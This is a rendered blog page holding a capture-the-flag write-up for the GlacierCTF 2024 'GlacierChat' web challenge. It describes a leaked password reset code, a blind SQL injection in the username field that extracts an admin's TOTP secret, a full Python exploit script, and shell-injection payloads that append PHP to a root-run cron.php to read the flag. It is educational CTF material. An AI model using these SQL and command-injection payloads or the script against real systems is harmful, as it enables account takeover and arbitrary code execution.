@@ -1,0 +1,332 @@
+<!DOCTYPE html>
+<html lang="en">
+
+    <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script><title>GlacierCTF 2024 - GlacierChat &ndash; TheMrEviil Blog</title>
+<meta name="description" content="![my image](/post/my_image.png)">
+
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<meta charset="UTF-8"/>
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css" integrity="sha512-DTOQO9RWCH3ppGqcWaEA1BIZOC6xxalwEsw9c2QQeAIftl+Vegovlnee1c9QX4TctnWMn13TZye+giMm8e2LwA==" crossorigin="anonymous" referrerpolicy="no-referrer" />
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/academicons/1.9.4/css/academicons.min.css" integrity="sha512-IW0nhlW5MgNydsXJO40En2EoCkTTjZhI3yuODrZIc8cQ4h1XcF53PsqDHa09NqnkXuIe0Oiyyj171BqZFwISBw==" crossorigin="anonymous" referrerpolicy="no-referrer" />
+
+
+<link rel="stylesheet" href="http://localhost:1313/css/palettes/base16-dark.css">
+<link rel="stylesheet" href="http://localhost:1313/css/risotto.css">
+<link rel="stylesheet" href="http://localhost:1313/css/custom.css">
+
+
+
+
+
+
+
+
+<link rel="alternate" type="application/rss+xml" href="http://localhost:1313/post/glacierctf2024/index.xml" title="TheMrEviil Blog">
+</head>
+
+    <body>
+        <div class="page">
+
+            <header class="page__header"><nav class="page__nav main-nav">
+    <ul>
+    <h1 class="page__logo"><a href="http://localhost:1313/" class="page__logo-inner">TheMrEviil Blog</a></h1>
+    
+    
+    <li class="main-nav__item"><a class="nav-main-item" href="http://localhost:1313/categories/writeups" title="">Writeups</a></li>
+    
+    <li class="main-nav__item"><a class="nav-main-item active" href="http://localhost:1313/post/" title="Posts">Posts</a></li>
+    
+    </ul>
+</nav>
+
+</header>
+
+            <section class="page__body">
+    <header class="content__header">
+        <h1>GlacierCTF 2024 - GlacierChat</h1>
+        <h1 id="web-glacierchat">WEB: GlacierChat</h1>
+<h2 id="description">Description</h2>
+<pre tabindex="0"><code>We are happy to launch our new GlacierChat this year.
+</code></pre><hr>
+<p>Hi! This challenge was quite difficult, but I managed to solve it. Here&rsquo;s a detailed write-up of how I did it.</p>
+<hr>
+<h2 id="step-1-initial-exploration">Step 1: Initial Exploration</h2>
+<p>After opening the website, I found a login form and a link to reset the password. While examining the code, I discovered an interesting parameter: <code>is_tenant</code>. If its value was set to <code>1</code>, a &ldquo;debug&rdquo; notification appeared, revealing the password reset code.</p>
+<h3 id="password-reset">Password Reset</h3>
+<p>Using this information, I accessed the <code>/set_new_password.php</code> endpoint, which allowed me to reset the password.</p>
+<p><strong>FIRST SUCCESS!</strong></p>
+<hr>
+<h2 id="step-2-dual-authentication-verification">Step 2: Dual Authentication Verification</h2>
+<p>Upon further exploration, I discovered the application used a dual authentication mechanism. By reading the code, I identified that the application leveraged <strong>OTPHP</strong> for generating and validating one-time passwords (OTPs). To better understand how OTPHP worked, I ran the challenge locally with debug prints.</p>
+<h3 id="key-observation">Key Observation:</h3>
+<p>In the database, there was a field called <code>secret_totp</code>, which stored a token. This token was validated by the OTPHP library after being converted into numbers.</p>
+<h3 id="what-is-otphp">What is OTPHP?</h3>
+<p><strong>OTPHP</strong> is a PHP library that generates one-time passwords (OTPs) based on:</p>
+<ul>
+<li><strong>Time-based One-Time Password (TOTP)</strong>.</li>
+<li><strong>HMAC-based One-Time Password (HOTP)</strong>.</li>
+</ul>
+<p>These algorithms are widely used for two-factor authentication (2FA). OTPHP simplifies the implementation of these algorithms in PHP applications.</p>
+<p><em>(Thanks to ChatGPT for the quick explanation!)</em></p>
+<h3 id="footer-clue">Footer Clue:</h3>
+<p>In the page footer, I noticed the current time displayed. This could be converted into a timestamp for use in generating OTPs. But how could I extract the <code>secret_totp</code>?</p>
+<hr>
+<h2 id="step-3-finding-the-vulnerability">Step 3: Finding the Vulnerability</h2>
+<p>After digging through the code for a few hours, I came across this snippet:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span>$stmt <span style="color:#f92672">=</span> $db<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">prepare</span>(<span style="color:#e6db74">&#34;SELECT password_cost FROM </span><span style="color:#e6db74">$users_table</span><span style="color:#e6db74"> WHERE reset_code = :code AND username = &#39;</span><span style="color:#e6db74">$username</span><span style="color:#e6db74">&#39;&#34;</span>);
+</span></span><span style="display:flex;"><span>$stmt<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">bindValue</span>(<span style="color:#e6db74">&#34;:code&#34;</span>, $code, <span style="color:#a6e22e">SQLITE3_TEXT</span>);
+</span></span><span style="display:flex;"><span>$stmt<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">bindValue</span>(<span style="color:#e6db74">&#34;:username&#34;</span>, $username, <span style="color:#f92672">...</span>);
+</span></span></code></pre></div><p>Here’s what I found:</p>
+<ol>
+<li>The <code>$username</code> parameter was not validated properly.</li>
+<li>The function always returned <code>&quot;Successfully reset password&quot;</code> regardless of whether the reset code was valid, due to the placement of the print statement.</li>
+</ol>
+<p>I could confirm whether the reset succeeded by attempting to log in with the new password.</p>
+<hr>
+<h2 id="step-4-exploiting-the-vulnerability">Step 4: Exploiting the Vulnerability</h2>
+<p>Once I gathered all the necessary information, I crafted an exploit to reset the password and gain access. Upon success, I obtained a session cookie with credentials for the dashboard.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> pwn 
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> requests
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> concurrent.futures
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> time
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> sys
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> re
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> pyotp
+</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> datetime <span style="color:#f92672">import</span> datetime
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>headers <span style="color:#f92672">=</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;User-Agent&#34;</span>: <span style="color:#e6db74">&#34;Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:132.0) Gecko/20100101 Firefox/132.0&#34;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;Accept&#34;</span>: <span style="color:#e6db74">&#34;text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8&#34;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;Accept-Language&#34;</span>: <span style="color:#e6db74">&#34;en-US,en;q=0.5&#34;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;Accept-Encoding&#34;</span>: <span style="color:#e6db74">&#34;gzip, deflate, br&#34;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;Content-Type&#34;</span>: <span style="color:#e6db74">&#34;application/x-www-form-urlencoded&#34;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;Upgrade-Insecure-Requests&#34;</span>: <span style="color:#e6db74">&#34;1&#34;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;Sec-Fetch-Dest&#34;</span>: <span style="color:#e6db74">&#34;document&#34;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;Sec-Fetch-Mode&#34;</span>: <span style="color:#e6db74">&#34;navigate&#34;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;Sec-Fetch-Site&#34;</span>: <span style="color:#e6db74">&#34;same-origin&#34;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;Sec-Fetch-User&#34;</span>: <span style="color:#e6db74">&#34;?1&#34;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;Priority&#34;</span>: <span style="color:#e6db74">&#34;u=0, i&#34;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;Te&#34;</span>: <span style="color:#e6db74">&#34;trailers&#34;</span>
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>cookies <span style="color:#f92672">=</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;PHPSESSID&#34;</span>: <span style="color:#e6db74">&#34;2l22enmb5771kj2tojhaojqnhp&#34;</span>
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>key_ <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">send_otp_request</span>(data, endpoint):
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">global</span> cookies
+</span></span><span style="display:flex;"><span>    response <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>post(url_main <span style="color:#f92672">+</span> endpoint, headers<span style="color:#f92672">=</span>headers, cookies<span style="color:#f92672">=</span>cookies, data<span style="color:#f92672">=</span>data)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> <span style="color:#e6db74">&#34;Set-Cookie&#34;</span> <span style="color:#f92672">in</span> response<span style="color:#f92672">.</span>headers:
+</span></span><span style="display:flex;"><span>        new_session <span style="color:#f92672">=</span> extract_phpsessid(response<span style="color:#f92672">.</span>headers[<span style="color:#e6db74">&#34;Set-Cookie&#34;</span>])
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> new_session:
+</span></span><span style="display:flex;"><span>            cookies[<span style="color:#e6db74">&#34;PHPSESSID&#34;</span>] <span style="color:#f92672">=</span> new_session
+</span></span><span style="display:flex;"><span>            print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;Zaktualizowano PHPSESSID: </span><span style="color:#e6db74">{</span>new_session<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> response
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">extract_phpsessid</span>(set_cookie_header):
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">match</span> <span style="color:#f92672">=</span> re<span style="color:#f92672">.</span>search(<span style="color:#e6db74">r</span><span style="color:#e6db74">&#34;PHPSESSID=([a-zA-Z0-9]+);&#34;</span>, set_cookie_header)
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> <span style="color:#66d9ef">match</span>:
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">match</span><span style="color:#f92672">.</span>group(<span style="color:#ae81ff">1</span>)
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">None</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">extract_reset_code</span>(response_text):
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">match</span> <span style="color:#f92672">=</span> re<span style="color:#f92672">.</span>search(<span style="color:#e6db74">r</span><span style="color:#e6db74">&#34;Reset code (\w+) uses custom prefix&#34;</span>, response_text)
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> <span style="color:#66d9ef">match</span>:
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">match</span><span style="color:#f92672">.</span>group(<span style="color:#ae81ff">1</span>)
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">None</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">first_step</span>(payload, offset):
+</span></span><span style="display:flex;"><span>    data <span style="color:#f92672">=</span> {
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;form_name&#34;</span>: <span style="color:#e6db74">&#34;reset&#34;</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;username&#34;</span>: <span style="color:#e6db74">&#34;admin&#34;</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;is_tenant&#34;</span>: <span style="color:#e6db74">&#34;1&#34;</span>
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    response <span style="color:#f92672">=</span> send_otp_request(data, <span style="color:#e6db74">&#34;/reset.php&#34;</span>)
+</span></span><span style="display:flex;"><span>    code_reset <span style="color:#f92672">=</span> extract_reset_code(response<span style="color:#f92672">.</span>text)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    print(code_reset)
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">##############################################################################################################3</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># sys.exit()</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> new_password(code_reset, payload, offset)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">new_password</span>(code_reset, payload, offset):
+</span></span><span style="display:flex;"><span>    data <span style="color:#f92672">=</span> {
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;form_name&#34;</span>: <span style="color:#e6db74">&#34;set_new_password&#34;</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;code&#34;</span>: code_reset,
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;username&#34;</span>: <span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;admin&#39; AND SUBSTRING(totp_secret, </span><span style="color:#e6db74">{</span>offset<span style="color:#e6db74">}</span><span style="color:#e6db74">, 1) == &#39;</span><span style="color:#e6db74">{</span>payload<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;password&#34;</span>: code_reset,
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;password_confirm&#34;</span>: code_reset
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;admin&#39; AND SUBSTRING(totp_secret, </span><span style="color:#e6db74">{</span>offset<span style="color:#e6db74">}</span><span style="color:#e6db74">, 1) == &#39;</span><span style="color:#e6db74">{</span>payload<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span>    response <span style="color:#f92672">=</span> send_otp_request(data, <span style="color:#e6db74">&#34;/set_new_password.php&#34;</span>)
+</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;off: </span><span style="color:#e6db74">{</span>offset<span style="color:#e6db74">}</span><span style="color:#e6db74"> Payl: </span><span style="color:#e6db74">{</span>payload<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> login_to(code_reset) <span style="color:#f92672">==</span> <span style="color:#66d9ef">True</span>:
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">global</span> key_
+</span></span><span style="display:flex;"><span>        print(payload)
+</span></span><span style="display:flex;"><span>        key_ <span style="color:#f92672">+=</span> payload
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">True</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">login_to</span>(new_password):
+</span></span><span style="display:flex;"><span>    data <span style="color:#f92672">=</span> {
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;form_name&#34;</span>: <span style="color:#e6db74">&#34;login&#34;</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;username&#34;</span>: <span style="color:#e6db74">&#34;admin&#34;</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;password&#34;</span>: new_password
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    response <span style="color:#f92672">=</span> send_otp_request(data, <span style="color:#e6db74">&#34;/login.php&#34;</span>)
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># print(response.text)</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> <span style="color:#e6db74">&#34;Wrong credentials&#34;</span> <span style="color:#f92672">in</span> response<span style="color:#f92672">.</span>text:
+</span></span><span style="display:flex;"><span>       
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">False</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">else</span>:
+</span></span><span style="display:flex;"><span>        
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">True</span> 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">convert_time</span>(data): 
+</span></span><span style="display:flex;"><span>    date_string <span style="color:#f92672">=</span> data
+</span></span><span style="display:flex;"><span>    dt_object <span style="color:#f92672">=</span> datetime<span style="color:#f92672">.</span>strptime(date_string, <span style="color:#e6db74">&#34;</span><span style="color:#e6db74">%a</span><span style="color:#e6db74">, </span><span style="color:#e6db74">%d</span><span style="color:#e6db74"> %b %Y %H:%M:%S %z&#34;</span>)
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> int(dt_object<span style="color:#f92672">.</span>timestamp())
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">get_time_from_page</span>():
+</span></span><span style="display:flex;"><span>    response <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>get(url_main<span style="color:#f92672">+</span><span style="color:#e6db74">&#34;/login.php&#34;</span>)
+</span></span><span style="display:flex;"><span>    pattern <span style="color:#f92672">=</span> <span style="color:#e6db74">r</span><span style="color:#e6db74">&#34;[A-Za-z]</span><span style="color:#e6db74">{3}</span><span style="color:#e6db74">, \d</span><span style="color:#e6db74">{2}</span><span style="color:#e6db74"> [A-Za-z]</span><span style="color:#e6db74">{3}</span><span style="color:#e6db74"> \d</span><span style="color:#e6db74">{4}</span><span style="color:#e6db74"> \d</span><span style="color:#e6db74">{2}</span><span style="color:#e6db74">:\d</span><span style="color:#e6db74">{2}</span><span style="color:#e6db74">:\d</span><span style="color:#e6db74">{2}</span><span style="color:#e6db74"> \+\d</span><span style="color:#e6db74">{4}</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    matches <span style="color:#f92672">=</span> re<span style="color:#f92672">.</span>findall(pattern, response<span style="color:#f92672">.</span>text)
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> matches
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>url_main <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;https://8cab891804e0738b14747428d79742fe.glacierchat.web.glacierctf.com&#34;</span>  <span style="color:#75715e"># Adres URL</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">two_auth</span>(otp):
+</span></span><span style="display:flex;"><span>    data <span style="color:#f92672">=</span> {
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;form_name&#34;</span>: <span style="color:#e6db74">&#34;totp&#34;</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;totp&#34;</span>: otp
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    response <span style="color:#f92672">=</span> send_otp_request(data, <span style="color:#e6db74">&#39;/totp.php&#39;</span>)
+</span></span><span style="display:flex;"><span>    print(response<span style="color:#f92672">.</span>text)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> offsety <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">1</span>,<span style="color:#ae81ff">9</span>):
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> payl <span style="color:#f92672">in</span> <span style="color:#e6db74">&#34;ABCDEFGHIJKLMNPQRSTUVWXYZ234567&#34;</span>:
+</span></span><span style="display:flex;"><span>        first_step(payl, offsety)
+</span></span><span style="display:flex;"><span>print(key_)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>data_page <span style="color:#f92672">=</span> get_time_from_page()[<span style="color:#ae81ff">0</span>]
+</span></span><span style="display:flex;"><span>data_timestamp <span style="color:#f92672">=</span> convert_time(data_page)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>totp <span style="color:#f92672">=</span> pyotp<span style="color:#f92672">.</span>TOTP(key_)
+</span></span><span style="display:flex;"><span>token <span style="color:#f92672">=</span> totp<span style="color:#f92672">.</span>at(data_timestamp)
+</span></span><span style="display:flex;"><span>print(token)
+</span></span><span style="display:flex;"><span>two_auth(token)
+</span></span><span style="display:flex;"><span>print(cookies[<span style="color:#e6db74">&#34;PHPSESSID&#34;</span>])
+</span></span></code></pre></div><hr>
+<h2 id="step-5-command-injection-discovery">Step 5: Command Injection Discovery</h2>
+<p>On the dashboard, I found a form to add jokes with an option to upload a media URL. I tested the input field with this payload:</p>
+<pre tabindex="0"><code>;&#34;ad;as&#39;d;asd&#39;as;d&#34;
+</code></pre><p>From the resulting error (Base64-encoded), I discovered the application was using shell commands, leading to a potential <strong>command injection vulnerability</strong>.</p>
+<h3 id="challenge">Challenge:</h3>
+<p>The input field strictly validated URLs. Using <code>%20</code> (a space character in URLs) didn’t work in the shell.</p>
+<p>After several hours of testing, I found a way to bypass the restrictions and copy the flag to the website directory without proper permissions.</p>
+<hr>
+<h2 id="step-6-leveraging-cronphp">Step 6: Leveraging <code>cron.php</code></h2>
+<p>While exploring further, I found a script called <code>cron.php</code>, which was triggered at intervals with <strong>root permissions</strong>. This gave me the perfect opportunity to inject malicious code.</p>
+<h3 id="payloads">Payloads:</h3>
+<p>Here are the payloads I used to extract the flag:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>ftp://example.com/;echo<span style="color:#e6db74">${</span>IFS<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;&lt;?php&#34;</span>&gt;&gt;/var/www/cron.php
+</span></span><span style="display:flex;"><span>ftp://example.com/;echo<span style="color:#e6db74">${</span>IFS<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;$lol1=file_get_contents(&#34;/flag.txt&#34;);&#39;</span>&gt;&gt;/var/www/cron.php
+</span></span><span style="display:flex;"><span>ftp://example.com/;echo<span style="color:#e6db74">${</span>IFS<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;file_put_contents(&#34;/var/www/html/assets/main.css&#34;,$lol1,FILE_APPEND);&#39;</span>&gt;&gt;/var/www/cron.php
+</span></span></code></pre></div><hr>
+<h2 id="step-7-retrieving-the-flag">Step 7: Retrieving the Flag</h2>
+<p>After successfully injecting the payloads, I navigated to <code>main.css</code> in the application directory. The flag was stored there. 🎉</p>
+<p><strong>Challenge Complete!</strong></p>
+
+    </header>
+
+    
+
+            </section>
+
+            <section class="page__aside">
+                <div class="aside__about">
+<div class="aside__about">
+    
+<h1 class="about__title">Jakub Przepióra</h1>
+<p class="about__description"><img src="/post/my_image.png" alt="my image"></p>
+</div>
+
+
+<ul class="aside__social-links">
+    
+    <li>
+        <a href="https://github.com/jakub-przepiora" rel="me" aria-label="GitHub" title="GitHub"><i class="fa-brands fa-github" aria-hidden="true"></i></a>&nbsp;
+    </li>
+    
+    <li>
+        <a href="mailto:jakub.przepioraa@gmail.com" rel="me" aria-label="Email" title="Email"><i class="fa-solid fa-envelope" aria-hidden="true"></i></a>&nbsp;
+    </li>
+    
+    <li>
+        <a href="https://www.linkedin.com/in/jakub-przepiora/" rel="me" aria-label="Linkedin" title="Linkedin"><i class="fa-brands fa-linkedin" aria-hidden="true"></i></a>&nbsp;
+    </li>
+    
+    <li>
+        <a href="https://discord.com/users/295690522146897920" rel="me" aria-label="Linkedin" title="Linkedin"><i class="fa-brands fa-discord" aria-hidden="true"></i></a>&nbsp;
+    </li>
+    
+    <li>
+        <a href="https://www.youtube.com/@jakubprzepiora" rel="me" aria-label="Youtube" title="Youtube"><i class="fa-brands fa-youtube" aria-hidden="true"></i></a>&nbsp;
+    </li>
+    
+    <li>
+        <a href="/index.xml" rel="me" aria-label="RSS" title="RSS"><i class="fa-solid fa-rss" aria-hidden="true"></i></a>&nbsp;
+    </li>
+    
+</ul>
+</div>
+                <hr>
+                <div class="aside__content">
+    
+
+                </div>
+            </section>
+
+            <footer class="page__footer"><p>
+    
+    
+    
+    
+    
+    
+      
+    
+      
+    
+    
+    
+      
+      
+          
+            
+            
+                
+
+            
+          
+      
+    
+</p>
+<br /><br />
+</footer>
+
+        </div>
+    </body>
+
+</html>
